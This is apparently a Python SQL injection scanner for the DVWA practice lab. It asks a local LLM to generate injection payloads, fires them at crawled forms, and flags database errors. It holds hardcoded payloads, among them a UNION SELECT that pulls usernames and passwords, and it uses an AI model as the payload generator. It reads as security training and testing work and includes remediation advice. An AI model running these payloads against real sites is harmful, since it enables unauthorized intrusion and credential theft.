import os
import sys
import json
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from openai import OpenAI
import dotenv

dotenv.load_dotenv()

OLLAMA_BASE_URL = os.getenv("OLLAMA_BASE_URL", "http://localhost:11434/v1")
OLLAMA_MODEL = os.getenv("OLLAMA_MODEL", "qwen3-coder-next:cloud")

client = OpenAI(
    base_url=OLLAMA_BASE_URL,
    api_key="ollama"  
)

print(f"[*] Using Ollama model: {OLLAMA_MODEL} at {OLLAMA_BASE_URL}")

def generate_llm_payloads(form_data):
    prompt = f"""
    You are an expert penetration tester. Analyze the following HTML form structure and generate 5 highly effective SQL injection payloads tailored for it.
    Form details: {json.dumps(form_data)}
    
    Requirements:
    - Include a mix of error-based, union-based, and time-based payloads.
    - Respond ONLY with a valid JSON array of strings. 
    - Do not include markdown blocks, explanations, or any other text.
    
    Example format:
    ["'", "' OR 1=1--", "'; WAITFOR DELAY '0:0:5'--"]
    """
    try:
        response = client.chat.completions.create(
            model=OLLAMA_MODEL,
            messages=[
                {"role": "user", "content": prompt}
            ]
        )
        text = response.choices[0].message.content.strip()

        if text.startswith("```json"):
            text = text[7:]
        if text.startswith("```"):
            text = text[3:]
        if text.endswith("```"):
            text = text[:-3]

        payloads = json.loads(text.strip())

        if isinstance(payloads, list) and len(payloads) > 0:
            return payloads
        else:
            raise ValueError("LLM did not return a valid list.")

    except Exception as e:
        print(f"[-] LLM Payload Generation failed: {e}. Falling back to default payloads.")
        return ["'", "' OR '1'='1", "' UNION SELECT null, database() #", "' AND 1=0 UNION SELECT username, password FROM users --"]

def login_dvwa(login_url, username="admin", password="password"):
    session = requests.Session()
    try:
        login_page = session.get(login_url)
        soup = BeautifulSoup(login_page.text, 'html.parser')
        user_token = soup.find('input', {'name': 'user_token'})
        user_token_value = user_token['value'] if user_token else None

        login_data = {
            'username': username,
            'password': password,
            'Login': 'Login'
        }
        if user_token_value:
            login_data['user_token'] = user_token_value

        response = session.post(login_url, data=login_data)

        if response.status_code == 200:
            print("[+] Login successful.")
            session.cookies.set('security', 'low')
            print("[+] Security level forced to: low")
            return session
        else:
            print("[-] Login failed.")
            return None
    except Exception as e:
        print(f"[-] Login error: {e}")
        return None

def is_vulnerable(response_text):
    database_errors = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated"
    ]
    for error in database_errors:
        if error in response_text.lower():
            return True
    return False

def test_form(url, form, session, payloads):
    vulnerabilities = []
    action = urljoin(url, form['action']) if form['action'] else url
    method = form.get('method', 'get').lower()

    for payload in payloads:
        for input_field in form['inputs']:
            if input_field.get('type') in ['text', 'hidden', 'password']:
                name = input_field.get('name')
                if not name:
                    continue

                data = {}
                for inp in form['inputs']:
                    inp_name = inp.get('name', '')
                    data[inp_name] = payload if inp_name == name else inp.get('value', '')

                try:
                    if method == 'post':
                        response = session.post(action, data=data)
                        test_url = action
                    else:
                        response = session.get(action, params=data)
                        test_url = response.url

                    print(f"    [->] Testing {test_url}")
                    print(f"    [->] Payload: {payload[:50]}...")

                    if is_vulnerable(response.text):
                        print(f"    [!!] VULNERABLE: {url} | Input: {name} | Payload: {payload}")
                        vuln = {
                            'url': url,
                            'form_action': action,
                            'method': method,
                            'vulnerable_input': name,
                            'payload': payload,
                            'error_detected': "Database error message found in response",
                            'remediation': (
                                "Use parameterized queries (prepared statements) instead of string concatenation.\n\n"
                                "Example in PHP with PDO:\n"
                                "$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');\n"
                                "$stmt->execute([$id]);"
                            )
                        }
                        vulnerabilities.append(vuln)

                except requests.RequestException as e:
                    print(f"[-] Error testing {url}: {e}")

    return vulnerabilities

def main():
    if len(sys.argv) < 3:
        print("Usage: python sqli_tester.py <base_url> <login_url> [crawler_output]")
        print("Example: python sqli_tester.py http://localhost http://localhost/login.php result.json")
        sys.exit(1)

    base_url = sys.argv[1]
    login_url = sys.argv[2]
    crawler_output = sys.argv[3] if len(sys.argv) > 3 else 'result.json'

    session = login_dvwa(login_url)
    if not session:
        sys.exit(1)

    try:
        with open(crawler_output, 'r') as f:
            crawler_data = json.load(f)
    except FileNotFoundError:
        print(f"[-] Crawler output file '{crawler_output}' not found. Run the crawler first.")
        sys.exit(1)

    all_vulnerabilities = []
    
    # Extract forms from crawler output
    forms = crawler_data.get('forms', [])
    
    if not forms:
        print("[-] No forms found in crawler output.")
        sys.exit(1)

    print(f"[*] Found {len(forms)} forms to test for SQL Injection")
    
    for idx, form in enumerate(forms, 1):
        action = form.get('action', '')
        if not action:
            continue
            
        # Only test vulnerability pages
        if 'vulnerabilities' not in action:
            continue
            
        print(f"\n[*] Testing form {idx}: {action}")
        print(f"[*] Generating LLM payloads for form...")
        payloads = generate_llm_payloads(form)
        print(f"[+] Using {len(payloads)} payloads.")

        vulns = test_form(action, form, session, payloads)
        all_vulnerabilities.extend(vulns)

    with open('modules/sqli_vulnerabilities.json', 'w') as f:
        json.dump(all_vulnerabilities, f, indent=4)

    print(f"\n[+] Testing complete. Found {len(all_vulnerabilities)} vulnerabilities.")
    print("[+] Results saved to modules/sqli_vulnerabilities.json")

if __name__ == "__main__":
    main()